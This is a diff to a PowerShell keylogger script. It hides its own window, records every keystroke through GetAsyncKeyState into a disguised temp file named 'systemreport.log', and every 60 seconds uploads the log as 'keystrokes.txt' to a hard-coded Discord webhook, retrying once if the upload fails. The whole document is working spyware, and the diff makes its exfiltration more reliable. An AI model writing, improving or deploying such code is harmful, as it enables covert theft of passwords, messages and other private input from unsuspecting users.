@@ -1,44 +1,69 @@
 $hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
 $logFile = "$env:Temp\systemreport.log"
+$boundary = [System.Guid]::NewGuid().ToString()
 
-# Keylogger function using .NET
+# Keylogger functions
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -Name KeyLogger -Namespace Win32 -MemberDefinition @"
-[DllImport("user32.dll")] 
-public static extern short GetAsyncKeyState(int vKey);
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class KeyLogger {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+    
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
 "@
 
-# Stealth mechanism to hide window
-$stealthCode = @'
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'@
-Add-Type -Name Window -Namespace Win32 -MemberDefinition $stealthCode
-[Win32.Window]::ShowWindow((Get-Process -PID $PID).MainWindowHandle, 0)
+# Hide window
+[KeyLogger]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
 try {
     $lastSent = Get-Date
     while ($true) {
         Start-Sleep -Milliseconds 40
         
-        # Capture all ASCII characters
+        # Capture keystrokes
         1..254 | ForEach-Object {
-            $state = [Win32.KeyLogger]::GetAsyncKeyState($_)
-            if ($state -eq -32767) {
-                $key = [System.Windows.Forms.Keys]$_ | % {[char]$_}
-                if($key -match '[a-zA-Z0-9!@#$%^&*()_+{}\[\]:;",.<>?/\\|`~\-=]') {
-                    $key | Out-File $logFile -Append
+            if ([KeyLogger]::GetAsyncKeyState($_) -eq -32767) {
+                $key = [System.Windows.Forms.Keys]$_ | ForEach-Object {
+                    if ($_ -ge 32 -and $_ -le 126) { [char]$_ }
+                    else { "[" + $_.ToString() + "]" }
                 }
+                $key | Out-File $logFile -Append
             }
         }
-        
+
         # Exfiltrate every 60 seconds
         if ((Get-Date) - $lastSent -gt [TimeSpan]::FromSeconds(60)) {
-            if (Test-Path $logFile) {
-                $content = [System.IO.File]::ReadAllText($logFile)
-                if ($content.Trim().Length -gt 0) {
-                    $payload = @{ content = "``````" } | ConvertTo-Json
-                    Invoke-RestMethod -Uri $hook -Method Post -Body $payload -ContentType "application/json"
-                    Clear-Content $logFile
+            if (Test-Path $logFile -PathType Leaf) {
+                $content = Get-Content $logFile -Raw
+                if (-not [string]::IsNullOrWhiteSpace($content)) {
+                    $body = @(
+                        "--$boundary",
+                        "Content-Disposition: form-data; name=`"file`"; filename=`"keystrokes.txt`"",
+                        "Content-Type: text/plain",
+                        "",
+                        $content,
+                        "--$boundary--"
+                    ) -join "`r`n"
+
+                    try {
+                        Invoke-RestMethod -Uri $hook -Method Post `
+                            -ContentType "multipart/form-data; boundary=$boundary" `
+                            -Body $body
+                        Clear-Content $logFile
+                    }
+                    catch {
+                        # Retry once after 10 seconds
+                        Start-Sleep -Seconds 10
+                        Invoke-RestMethod -Uri $hook -Method Post `
+                            -ContentType "multipart/form-data; boundary=$boundary" `
+                            -Body $body
+                        Clear-Content $logFile
+                    }
                 }
             }
             $lastSent = Get-Date
@@ -46,5 +71,7 @@ try {
     }
 }
 finally {
-    Remove-Item $logFile -ErrorAction SilentlyContinue
+    if (Test-Path $logFile) {
+        Remove-Item $logFile -Force
+    }
 }
